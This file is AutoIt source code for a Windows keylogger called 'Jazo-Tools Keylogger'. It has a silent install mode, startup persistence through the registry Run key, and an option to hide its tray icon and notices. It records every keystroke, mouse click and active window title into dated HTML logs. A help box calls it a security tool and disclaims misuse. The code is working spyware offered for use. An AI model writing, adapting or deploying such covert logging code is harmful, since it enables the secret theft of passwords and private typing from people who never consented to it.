break(0);disllow close from the tasktray
;-------------------------------------------------------------comandline code for help install and ninstall
$i=0
if $cmdline[0] > 0 Then 
    If $cmdline[1] = "/install" Then
        if $cmdline[0] >= 2 Then
            If $cmdline[2] = "/silent" Then;auto install Script Silently
                RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log","exit", "REG_SZ", "e")
                RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log","Location", "REG_SZ", @ProgramFilesDir&"\Jazo-Tools\keylogger\")
                RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log","Silent", "REG_DWORD", "1")
                filecopy(@ScriptFullPath,@ProgramFilesDir&"\Jazo-Tools\keylogger\"&@scriptname,1)
                Regwrite ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","Jtlog.exe","REG_SZ",@ProgramFilesDir&"\Jazo-Tools\keylogger\"&@scriptname)
                $i=1
            EndIf
        endif
        if $i=0 Then
            $shortcut=Inputbox("Jazo-Tools Keylogger","please Enter your short cut key Ctrl+Alt+(your key)"&@crlf&"Default is e. WARNING! Enter ONE letter only!")
            $startup=Msgbox(4,"Jazo-Tools Keylogger"," Would you like this program to run at startup?")
            $silent=Msgbox(4,"Jazo-Tools Keylogger"," Would you like this program to run Silent?"&@crlf&@crlf&"the program will not display a message when it is starting or closing, and it will not show an icon in the tasktray.")
            $location=FileSelectFolder("Choose an Install Location.  The Logfiles will be located in this directory Under 'Logfiles'", "",3)
            dircreate($location&"\Jazo-Tools\keylogger\")
            if $silent =6 Then $silent=1
            if $silent =7 Then $silent=0
            RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log","exit", "REG_SZ", $shortcut)
            RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log","Location", "REG_SZ", $location&"\Jazo-Tools\keylogger\")
            RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log","Silent", "REG_DWORD", $silent)
            filecopy(@ScriptFullPath,$location&"\Jazo-Tools\keylogger\"&@scriptname,1)
            if $startup = 6 Then Regwrite ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","Jtlog.exe","REG_SZ",$location&"\Jazo-Tools\keylogger\"&@scriptname)
                        
        EndIf
    EndIf
    if $cmdline[1] = "/help" then 
        Msgbox(0,"Jazo-Tools Keylogger","This is a simple keylogger Created By Jason Zetter"&@crlf&"this is created as a security tool and i cannot be held responsible for any missuse of this program"&@crlf&""&@crlf&"Help:"&@crlf&"/install - Installs the program with an interface"&@crlf&"/install /silent - installs the program with the defauld valuse in silent"&@crlf&"/help - displays this help box"&@crlf&"/uninstall - this removes the program and all the settings from your system WARNING this DOES remove the log files."&@crlf&""&@crlf&"This Program was created with the Awsome Freeware Basic programing language Auto-it!"&@crlf&""&@crlf&"For updates and other Programs Created by Jazo-tools Send your browser to Http://www.jazo-online.com.au.tt")
        Exit
    EndIf
    if $cmdline[1] = "/uninstall" Then
        $log=RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log","Location")
        RegDelete ("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log")
        msgbox(0,"",$log)
        dirremove($log,1)
        msgbox(0,"Jazo-Tools Keylogger","The keylogger has been removed Thankyou For your use of this program!")
        exit
    EndIf
EndIf
;-----------------------------------------------------Check if program is installed... if not install it------------------------------
$var = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log", "")
if $var <= 1 Then
    $shortcut=Inputbox("Jazo-Tools Keylogger","please Enter your short cut key Ctrl+Alt+(your key)"&@crlf&"Default is e. WARNING! Enter ONE letter only!")
    $startup=Msgbox(4,"Jazo-Tools Keylogger"," Would you like this program to run at startup?")
    $silent=Msgbox(4,"Jazo-Tools Keylogger"," Would you like this program to run Silent?"&@crlf&@crlf&"the program will not display a message when it is starting or closing, and it will not show an icon in the tasktray.")
    $location=FileSelectFolder("Choose an Install Location.  The Logfiles will be located in this directory Under 'Logfiles'", "",3)
    dircreate($location&"\Jazo-Tools\keylogger\")
    if $silent =6 Then $silent=1
    if $silent =7 Then $silent=0
    RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log","exit", "REG_SZ", $shortcut)
    RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log","Location", "REG_SZ", $location&"\Jazo-Tools\keylogger\")
    RegWrite ( "HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log","Silent", "REG_DWORD", $silent)
    filecopy(@ScriptFullPath,$location&"\Jazo-Tools\keylogger\"&@scriptname,1)
    if $startup = 6 Then Regwrite ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","Jtlog.exe","REG_SZ",$location&"\Jazo-Tools\keylogger\"&@scriptname)
    EndIf

;------------------------------------------------------------Set Settings--------------------
$window2=""
$date=@year&@mon&@mday
$log=RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log","Location")
$exit=RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log","exit")
$silent=RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Jazo tools\log","silent")
DirCreate ($log)
HotKeySet("^!"&$exit, "Terminate");Shift-Alt-d
if $silent=0 Then traytip("Jazo-Tools Keylogger","Your System is now Protected","",1)
Opt("TrayIconHide", $silent)  
;------------------------------------------------Other Functions------------------
Func _IsPressed($hexKey)



Local $aR, $bRv
$hexKey = '0x' & $hexKey
$aR = DllCall($user32, "int", "GetAsyncKeyState", "int", $hexKey)

If $aR[0] <> 0 Then
    $bRv = 1
Else
    $bRv = 0
EndIf

Return $bRv
EndFunc  

$file = FileOpen($log&"\logfiles"&$date&".htm", 1)
If $file = -1 Then
  Exit
EndIf
filewrite($file,"<font face=Verdana size=1>")

Func Terminate()
DllClose ( $user32 )
FileClose ( $file )
if $silent=0 Then traytip("Jazo-Tools Keylogger","Your System is no Longer Protected",15,3)
    sleep(1000)
    Exit 0
EndFunc
Opt("OnExitFunc","Terminate")
$user32 = DllOpen ( "user32" )
While 1
;---------------------------------------------end program header, begin program----------------------------
For $n = 41 To 49
    If _IsPressed($n) Then
        _LogKeyPress(Chr($n+56))
    EndIf
Next

If _IsPressed('4a') Then
    _LogKeyPress("j")
EndIf


If _IsPressed('4b') Then
    _LogKeyPress("k")
EndIf


If _IsPressed('4c') Then
    _LogKeyPress("l")
EndIf


If _IsPressed('4d') Then
    _LogKeyPress("m")
EndIf


If _IsPressed('4e') = 1 Then 
    _LogKeyPress("n")
EndIf


If _IsPressed('4f') Then
    _LogKeyPress("o")
EndIf

For $n = 50 To 59
    If _IsPressed($n) Then
        _LogKeyPress(Chr($n+56))
    EndIf
Next

If _IsPressed('5a') Then
    _LogKeyPress("z")
EndIf


If _IsPressed('01') Then
    _LogKeyPress("<font color=#008000 style=font-size:9px><i>{LEFT MOUSE}</i></font>")
EndIf

If _IsPressed('02') Then
    _LogKeyPress("<font color=#008000 style=font-size:9px><i>{RIGHT MOUSE}</i></font>")
EndIf


   If _IsPressed('08') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{BACKSPACE}</i></font>")
EndIf


   If _IsPressed('09') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{TAB}</i></font>")
EndIf


   If _IsPressed('0d') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{ENTER}</i></font>")
EndIf


   If _IsPressed('10') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{SHIFT}</i></font>")
EndIf


     If _IsPressed('11') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{CTRL}</i></font>")
EndIf


     If _IsPressed('12') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{ALT}</i></font>")
EndIf


   If _IsPressed('13') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{PAUSE}</i></font>")
EndIf   


  If _IsPressed('14') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{CAPSLOCK}</i></font>")
EndIf


   If _IsPressed('1b') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{ESC}</i></font>")
EndIf


   If _IsPressed('20') Then
    _LogKeyPress(" ")
EndIf


     If _IsPressed('21') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{PGUP}</i></font>")
EndIf


     If _IsPressed('22') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{PGDOWN}</i></font>")
EndIf


     If _IsPressed('23') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{END}</i></font>")
EndIf


     If _IsPressed('24') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{HOME}</i></font>")
EndIf


     If _IsPressed('25') Then
    _LogKeyPress("<font color=#008000 style=font-size:9px><i>{LEFT ARROW}</i></font>")
EndIf


     If _IsPressed('26') Then
    _LogKeyPress("<font color=#008000 style=font-size:9px><i>{UP ARROW}</i></font>")
EndIf


     If _IsPressed('27') Then
    _LogKeyPress("<font color=#008000 style=font-size:9px><i>{RIGHT ARROW}</i></font>")
EndIf


     If _IsPressed('28') Then
    _LogKeyPress("<font color=#008000 style=font-size:9px><i>{DOWN ARROW}</i></font>")
EndIf


     If _IsPressed('2c') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{PRNTSCRN}</i></font>")
EndIf


     If _IsPressed('2d') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{INSERT}</i></font>")
EndIf


     If _IsPressed('2e') Then
    _LogKeyPress("<font color=#FF8000 style=font-size:9px><i>{DEL}</i></font>")
EndIf

For $n = 30 To 39
    If _IsPressed($n) Then
        _LogKeyPress(StringRight( $n, 1 ))
    EndIf
Next
WEnd


Func _LogKeyPress($what2log)
$window=wingettitle("")
if $window=$window2 Then 
    FileWrite($file,$what2log) 
    Sleep(100)
Else
$window2=$window
FileWrite($file, "<br><BR>" & "<b>["& @Year&"."&@mon&"."&@mday&"  "&@HOUR & ":" &@MIN & ":" &@SEC & ']  Window: "'& $window& '"</b><br>'& $what2log)
sleep (100)
Endif
EndFunc